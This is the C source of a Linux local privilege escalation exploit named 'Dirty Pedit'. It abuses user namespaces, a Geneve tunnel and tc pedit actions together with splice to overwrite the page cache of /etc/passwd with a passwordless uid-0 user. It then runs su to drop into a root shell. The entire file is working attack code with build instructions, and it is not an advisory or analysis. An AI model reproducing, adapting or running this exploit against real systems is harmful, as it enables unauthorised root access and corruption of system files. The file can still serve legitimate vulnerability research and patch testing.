/*
 * Dirty Pedit — Local Privilege Escalation
 * =========================================
 * Overwrites a line in /etc/passwd with "a::0:0::/:\n" — a new user
 * with uid=0 (root) and no password. Then: su a → root shell.
 *
 * Writes 12 bytes over a sacrificial line (e.g. nobody):
 *   Before: nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 *   After:  a::0:0::/:\n\n34:65534:nobody:/nonexistent:/usr/sbin/nologin
 *           ^^^^^^^^^^^ valid root entry    ^^^^^^^^^ broken line (ignored)
 *
 * Three network-typed pedit keys at offsets 20, 24, 28:
 *   hint = 32 → max_offset = (u32)(-16) + 32 = 16 ≤ headlen(20)
 *   → no linearization → writes go to page-cache frags!
 *
 * Fully unprivileged: user namespaces only.
 * Build: gcc -static -o dirty_pedit_privesc dirty_pedit_privesc.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/if_link.h>

#define GENEVE_PORT 6081
#define GENEVE_VNI 0x123456
#define SPLICE_SIZE 4096

#ifndef IFLA_GENEVE_INNER_PROTO_INHERIT
#define IFLA_GENEVE_INNER_PROTO_INHERIT 14
#endif

struct genevehdr {
    uint8_t ver_optlen, flags;
    uint16_t proto_type;
    uint8_t vni[3], reserved;
} __attribute__((packed));

static int run_cmd(const char *fmt, ...) {
    char cmd[512]; va_list ap;
    va_start(ap, fmt); vsnprintf(cmd, sizeof(cmd), fmt, ap); va_end(ap);
    return system(cmd);
}

static int setup_ns(void) {
    uid_t uid = getuid(); gid_t gid = getgid();
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) return -1;
    char buf[256]; int fd;
    fd = open("/proc/self/setgroups", O_WRONLY);
    if (fd >= 0) { write(fd, "deny", 4); close(fd); }
    snprintf(buf, sizeof(buf), "0 %d 1", uid);
    fd = open("/proc/self/uid_map", O_WRONLY);
    if (fd < 0) return -1; write(fd, buf, strlen(buf)); close(fd);
    snprintf(buf, sizeof(buf), "0 %d 1", gid);
    fd = open("/proc/self/gid_map", O_WRONLY);
    if (fd < 0) return -1; write(fd, buf, strlen(buf)); close(fd);
    return 0;
}

#define NLMSG_TAIL(n) ((struct rtattr*)(((char*)(n))+NLMSG_ALIGN((n)->nlmsg_len)))
static int nla_put(struct nlmsghdr *n, int max, int type, const void *d, int l) {
    struct rtattr *r = NLMSG_TAIL(n); int len = RTA_LENGTH(l);
    if (NLMSG_ALIGN(n->nlmsg_len)+RTA_ALIGN(len) > (unsigned)max) return -1;
    r->rta_type = type; r->rta_len = len;
    if (d && l) memcpy(RTA_DATA(r), d, l);
    n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len)+RTA_ALIGN(len); return 0;
}
static struct rtattr *nla_nest(struct nlmsghdr *n, int max, int type) {
    struct rtattr *r = NLMSG_TAIL(n); nla_put(n, max, type, NULL, 0); return r;
}
static void nla_end(struct nlmsghdr *n, struct rtattr *r) {
    r->rta_len = (char*)NLMSG_TAIL(n) - (char*)r;
}

static int create_geneve(void) {
    struct { struct nlmsghdr n; struct ifinfomsg i; char b[1024]; } req = {};
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    uint32_t vni = GENEVE_VNI, raddr; uint16_t pbe = htons(GENEVE_PORT);
    inet_pton(AF_INET, "10.0.0.1", &raddr);
    req.n.nlmsg_len = NLMSG_LENGTH(sizeof(struct ifinfomsg));
    req.n.nlmsg_type = RTM_NEWLINK;
    req.n.nlmsg_flags = NLM_F_REQUEST|NLM_F_CREATE|NLM_F_EXCL|NLM_F_ACK;
    req.n.nlmsg_seq = 1;
    nla_put(&req.n, sizeof(req), IFLA_IFNAME, "geneve0", 8);
    struct rtattr *li = nla_nest(&req.n, sizeof(req), IFLA_LINKINFO);
    nla_put(&req.n, sizeof(req), IFLA_INFO_KIND, "geneve", 7);
    struct rtattr *d = nla_nest(&req.n, sizeof(req), IFLA_INFO_DATA);
    nla_put(&req.n, sizeof(req), IFLA_GENEVE_ID, &vni, 4);
    nla_put(&req.n, sizeof(req), IFLA_GENEVE_REMOTE, &raddr, 4);
    nla_put(&req.n, sizeof(req), IFLA_GENEVE_PORT, &pbe, 2);
    nla_put(&req.n, sizeof(req), IFLA_GENEVE_INNER_PROTO_INHERIT, NULL, 0);
    nla_end(&req.n, d); nla_end(&req.n, li);
    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (fd < 0) return -1;
    bind(fd, (struct sockaddr*)&sa, sizeof(sa));
    sendto(fd, &req, req.n.nlmsg_len, 0, (struct sockaddr*)&sa, sizeof(sa));
    char ack[4096]; int r = recv(fd, ack, sizeof(ack), 0); close(fd);
    if (r > 0 && ((struct nlmsghdr*)ack)->nlmsg_type == NLMSG_ERROR)
        if (((struct nlmsgerr*)NLMSG_DATA((struct nlmsghdr*)ack))->error) return -1;
    return 0;
}

/*
 * Find byte offset of a suitable victim line in /etc/passwd.
 * Picks the last line that's ≥ 12 bytes (enough for our overwrite).
 */
static int find_victim_offset(const char *path, int *out_offset, char *out_line, int maxline) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    char buf[4096];
    int n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return -1;
    buf[n] = 0;

    int best_off = -1;
    char *p = buf;
    while (*p) {
        char *nl = strchr(p, '\n');
        int linelen = nl ? (nl - p + 1) : (int)strlen(p);
        if (linelen >= 12 && strncmp(p, "root:", 5) != 0) {
            best_off = (int)(p - buf);
            if (out_line) {
                int copy = linelen < maxline - 1 ? linelen : maxline - 1;
                memcpy(out_line, p, copy);
                out_line[copy] = 0;
            }
        }
        p += linelen;
    }
    *out_offset = best_off;
    return best_off >= 0 ? 0 : -1;
}

static void do_corrupt(const char *target, int file_offset)
{
    if (setup_ns() < 0) _exit(1);
    run_cmd("ip link set lo up >/dev/null 2>&1");
    run_cmd("ip addr add 10.0.0.1/24 dev lo 2>/dev/null");
    run_cmd("ip addr add 10.0.0.2/24 dev lo 2>/dev/null");
    if (create_geneve() < 0) { fprintf(stderr, "[-] geneve failed\n"); _exit(1); }
    run_cmd("ip link set geneve0 up 2>/dev/null");
    run_cmd("tc qdisc add dev geneve0 ingress 2>/dev/null");

    /*
     * Overwrite target: "a::0:0::/:\n\n" (12 bytes)
     *
     * Three network-typed keys at raw offsets 20, 24, 28.
     * pedit "munge offset N u32 set VAL" stores VAL in NETWORK byte order
     * (big-endian), so we specify bytes in reading order:
     *
     *   bytes 0-3:  a  :  :  0  → 0x613a3a30
     *   bytes 4-7:  :  0  :  :  → 0x3a303a3a
     *   bytes 8-11: /  :  \n \n → 0x2f3a0a0a
     */
    if (run_cmd("tc filter add dev geneve0 ingress protocol all "
                "u32 match u32 0 0 "
                "action pedit ex "
                "munge offset 20 u32 set 0x613a3a30 "
                "munge offset 24 u32 set 0x3a303a3a "
                "munge offset 28 u32 set 0x2f3a0a0a") != 0) {
        fprintf(stderr, "[-] TC failed\n"); _exit(1);
    }

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in ba = { .sin_family = AF_INET };
    inet_pton(AF_INET, "10.0.0.1", &ba.sin_addr);
    bind(sock, (struct sockaddr*)&ba, sizeof(ba));
    struct sockaddr_in da = { .sin_family = AF_INET, .sin_port = htons(GENEVE_PORT) };
    inet_pton(AF_INET, "10.0.0.2", &da.sin_addr);
    connect(sock, (struct sockaddr*)&da, sizeof(da));

    /* Geneve + inner IPv4 header */
    char hdr[64]; int hlen = 0;
    struct genevehdr *g = (struct genevehdr*)hdr;
    memset(g, 0, sizeof(*g));
    g->proto_type = htons(0x0800);
    g->vni[0]=(GENEVE_VNI>>16)&0xff; g->vni[1]=(GENEVE_VNI>>8)&0xff; g->vni[2]=GENEVE_VNI&0xff;
    hlen += sizeof(*g);
    struct iphdr *ip = (struct iphdr*)(hdr+hlen);
    memset(ip, 0, sizeof(*ip));
    ip->version=4; ip->ihl=5; ip->tot_len=htons(20+SPLICE_SIZE);
    ip->ttl=64; ip->protocol=IPPROTO_RAW;
    ip->saddr=htonl(0x0a000001); ip->daddr=htonl(0x0a000002);
    uint32_t cs=0; uint16_t *cp=(uint16_t*)ip;
    for(int i=0;i<10;i++) cs+=ntohs(cp[i]);
    while(cs>>16) cs=(cs&0xffff)+(cs>>16);
    ip->check=htons(~cs&0xffff);
    hlen += sizeof(*ip);

    /* Splice from the victim line's offset */
    int ffd = open(target, O_RDONLY);
    if (ffd < 0) { perror("open"); _exit(1); }

    for (int i = 0; i < 5; i++) {
        int pfd[2]; pipe(pfd);
        struct iovec iov = { .iov_base=hdr, .iov_len=hlen };
        vmsplice(pfd[1], &iov, 1, 0);
        loff_t off = file_offset;
        splice(ffd, &off, pfd[1], NULL, SPLICE_SIZE, SPLICE_F_MOVE);
        splice(pfd[0], NULL, sock, NULL, hlen+SPLICE_SIZE, SPLICE_F_MOVE);
        close(pfd[0]); close(pfd[1]);
        usleep(50000);
    }
    close(ffd); close(sock);
    _exit(0);
}

int main(void)
{
    const char *target = "/etc/passwd";
    printf("[*] Dirty Pedit — Local Privilege Escalation\n");
    printf("[*] uid=%d pid=%d\n\n", getuid(), getpid());

    /* Find victim line */
    int victim_off;
    char victim_line[128];
    if (find_victim_offset(target, &victim_off, victim_line, sizeof(victim_line)) < 0) {
        printf("[-] No suitable victim line in %s\n", target);
        return 1;
    }
    printf("[*] Victim line at offset %d: %s", victim_off, victim_line);
    if (victim_line[strlen(victim_line)-1] != '\n') printf("\n");

    /* Show before */
    printf("[*] /etc/passwd before:\n");
    run_cmd("cat /etc/passwd");
    printf("\n");

    /* Corrupt */
    printf("[*] Injecting user 'a' (uid=0, no password) over victim line...\n");
    pid_t pid = fork();
    if (pid == 0) do_corrupt(target, victim_off);
    waitpid(pid, NULL, 0);
    usleep(200000);

    /* Show after */
    printf("[*] /etc/passwd after:\n");
    run_cmd("cat /etc/passwd");
    printf("\n");

    /* Check */
    char buf[4096];
    int fd = open(target, O_RDONLY);
    int n = read(fd, buf, sizeof(buf)-1); close(fd);
    buf[n] = 0;

    if (strstr(buf, "a::0:0::/:\n")) {
        printf("[+] User 'a' injected with uid=0!\n");
        printf("[+] Running: su a\n\n");
        execlp("su", "su", "a", "-c",
               "id && echo '>>> ROOT SHELL <<<' && exec /bin/sh", NULL);
        perror("su");
    } else {
        printf("[-] Injection not found in /etc/passwd\n");
        return 1;
    }
    return 0;
}
